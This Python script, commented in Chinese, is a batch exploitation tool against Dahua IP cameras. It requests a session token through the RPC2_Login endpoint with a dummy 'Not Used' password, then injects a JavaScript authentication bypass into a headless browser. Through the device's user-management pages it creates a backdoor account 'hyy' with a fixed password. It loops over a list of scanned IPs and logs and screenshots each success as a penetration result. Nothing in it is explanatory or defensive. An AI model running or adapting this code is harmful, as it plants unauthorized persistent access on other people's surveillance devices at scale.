# encoding=utf-8
# 大华摄像头批量利用漏洞添加账号.
import httpx
from typing import Union
import playwright
from playwright.async_api import async_playwright, Playwright, Browser
import asyncio
from pathlib import Path
from utils.log import logger
import re

basepath = Path(__file__).parent.absolute()
res_file = Path(basepath, "res.txt")
jt_photo = Path(basepath, "dh_cev")
jt_photo.mkdir(exist_ok=True)
res_file = Path(basepath, "dh_cve_res.txt")


class Dahua(object):
    def __init__(self, ip: str) -> None:
        self.ip = ip
        self.addr = f"http://{self.ip}"
        header = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin":  self.addr+"/", "Referer":  self.addr+"/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

        self.session = httpx.Client(headers=header, timeout=10, verify=False)
        self.token = None
        self.js = Path(basepath, "dahua", "bypass_js.js").read_text(
            encoding="utf8")

    def get_token(self) -> Union[bool, str]:
        """获取 token"""
        url = self.addr+"/RPC2_Login"
        post_json = {"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard",
                                                                   "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}
        try:
            r = self.session.post(url, json=post_json)
            if r.status_code != 200:
                logger.info(f"[-] 大华摄像头 token 获取失败 请求码:{r.status_code}")
                return False
            r = r.json()
            if 'True' in str(r):
                self.token = r["session"]
                logger.success(f"[+] {self.ip} 大华摄像头 token 获取成功 {self.token}")
                self.session.cookies["DWebClientSessionID"] = self.token
                return self.token
        except Exception as e:
            logger.exception(f"[-] 大华摄像头 token 获取失败")
            return False

    async def run_v2(self, browser: Browser):
        """第二个版本"""
        set_xpath = "/html/body/div[2]/ul/li[5]/span"
        xtgl_xpath = "/html/body/div[2]/div[2]/div[5]/div[1]/div[1]/ul/li[5]/a/span"
        yhgl_xpath = "/html/body/div[2]/div[2]/div[5]/div[1]/div[1]/ul/li[5]/ul/li[2]/span"
        adduser_xpath = "/html/body/div[2]/div[2]/div[5]/div[1]/div[2]/div/div[2]/div/div[1]/div[2]/div[1]/div[3]/a"
        # /html/body/div[16]/div[2]/form/div[1]/div/input 用户名
        # /html/body/div[16]/div[2]/form/div[2]/div/input 密码
        # /html/body/div[16]/div[2]/form/div[4]/div/input 确认密码
        save_xpath = "/html/body/div[16]/div[3]/a[1]"

        context = await browser.new_context()

        # Open new page
        page = await browser.new_page()
        # 添加 session
        # await context.add_cookies(
        #     [
        #         {"name": "DhWebClientSessionID",
        #             "value": self.token, "domain": self.ip, "path": "/"},
        #         {"name": "username", "value": "admin",
        #             "domain": self.ip, "path": "/"},
        #     ]

        # )
        # Go to http://10.100.1.152/
        await page.goto(self.addr)

        # # 输入账号
        # await page.fill("id=login_user", "wCGg")
        # # 输入密码
        # await page.fill("id=login_psw", "12345678A")
        # # 点击登录按钮
        # await page.dblclick("xpath=/html/body/div[1]/div/div/div[2]/form/div[4]/a[1]")

        # 使用 js 脚本绕过
        await page.evaluate(self.js)
        await page.wait_for_timeout(5*1000)

        # 点击设置
        # /html/body/div[2]/ul/li[5]/span
        try:
            await page.click(f"xpath={set_xpath}")
        except playwright._impl._api_types.TimeoutError:
            await self.run_v2(browser)
            return

        await page.wait_for_timeout(3*1000)

        # 点击系统管理
        await page.click(
            f"xpath={xtgl_xpath}")

        # 点击 系统管理->用户管理
        await page.click(
            f"xpath={yhgl_xpath}")

        await page.wait_for_timeout(4*1000)

        # 点击增加用户
        await page.click(
            f"xpath={adduser_xpath}")

        # 输入用户名
        await page.fill("id=use_AUserName", "hyy")
        # 输入密码
        await page.fill("id=use_AUserPwd", "12345678A")
        # 确定密码
        await page.fill("id=use_AUserPwdCfm", "12345678A")
        # https://playwright.dev/python/docs/intro#timesleep-leads-to-outdated-state

        # 保存
        await page.click(f"xpath={save_xpath}")

        await page.wait_for_timeout(10*1000)

        await page.screenshot(path=Path(jt_photo, f"{self.ip}.png"))  # 截图
        # Close page
        await page.close()
        # ---------------------
        await context.close()
        await browser.close()

    async def run(self, browser: Browser) -> bool:
        """自动化添加用户"""
        # browser = await playwright.chromium.launch(headless=False)

        context = await browser.new_context()

        # Open new page
        page = await browser.new_page()
        # 添加 session
        # await context.add_cookies(
        #     [
        #         {"name": "DhWebClientSessionID",
        #             "value": self.token, "domain": self.ip, "path": "/"},
        #         {"name": "username", "value": "admin",
        #             "domain": self.ip, "path": "/"},
        #     ]

        # )
        # Go to http://10.100.1.152/
        await page.goto(self.addr)

        # # 输入账号
        # await page.fill("id=login_user", "wCGg")
        # # 输入密码
        # await page.fill("id=login_psw", "12345678A")
        # # 点击登录按钮
        # await page.dblclick("xpath=/html/body/div[1]/div/div/div[2]/form/div[4]/a[1]")

        # 使用 js 脚本绕过
        await page.evaluate(self.js)
        await page.wait_for_timeout(5*1000)

        # 点击设置
        # /html/body/div[2]/ul/li[5]/span
        try:
            await page.click("xpath=/html/body/div[2]/ul/li[5]/a")
        except playwright._impl._api_types.TimeoutError:
            logger.info(f"使用方案二....")
            await self.run_v2(browser)
            return

        await page.wait_for_timeout(3*1000)

        # 点击系统管理
        await page.click(
            "xpath=/html/body/div[2]/div[2]/div[5]/div[1]/div[1]/ul/li[5]/a")

        # 点击 系统管理->用户管理
        await page.click(
            "xpath=/html/body/div[2]/div[2]/div[5]/div[1]/div[1]/ul/li[5]/ul/li[2]")

        await page.wait_for_timeout(4*1000)

        # 点击增加用户
        await page.click(
            "xpath=/html/body/div[2]/div[2]/div[5]/div[1]/div[2]/div/div[2]/div/div[1]/div[2]/div[1]/div[3]/a")

        # 输入用户名
        await page.fill("id=use_AUserName", "hyy")
        # 输入密码
        await page.fill("id=use_AUserPwd", "12345678A")
        # 确定密码
        await page.fill("id=use_AUserPwdCfm", "12345678A")
        # https://playwright.dev/python/docs/intro#timesleep-leads-to-outdated-state

        # 保存
        await page.click("xpath=/html/body/div[16]/div[3]/a[1]")

        await page.wait_for_timeout(10*1000)

        await page.screenshot(path=Path(jt_photo, f"{self.ip}.png"))  # 截图
        # Close page
        await page.close()
        # ---------------------
        await context.close()
        await browser.close()

    async def main(self):
        if self.get_token():
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                try:
                    await self.run(browser)
                    save_res(f"[+] {self.ip}成功!")
                except Exception as e:
                    logger.exception("运行出现错误!", e)
                    save_res(f"[-] {self.ip}错误.....")
        else:
            logger.error("[-] 没有存在大华漏洞!")


def filter():
    """从 res.txt 中过滤大华web漏洞ip"""
    with res_file.open(mode="r", encoding="utf8") as fp:
        cs = fp.read().strip().split("\n")
        # print(c)
        lst = []
        for c in cs:
            if "大华web漏洞" in c:
                # lst.append()
                lst.append((re.findall("\] (\S+)存在", c)[0]))
    with Path(basepath, "dahua_cve.txt").open(mode="a", encoding="utf8") as f:
        for l in lst:
            f.write(l+"\n")


def save_res(msg):
    """保存渗透结果"""
    with res_file.open(mode="a", encoding="utf8") as fp:
        logger.success(msg)
        fp.write(msg+"\n")


def read_ip() -> list:
    """加载ip"""
    with Path(basepath, "dahua_cve.txt").open(mode="r", encoding="utf8") as f:
        return f.read().strip().split("\n")


if __name__ == "__main__":
    for ip in read_ip():
        asyncio.run(Dahua(ip).main())
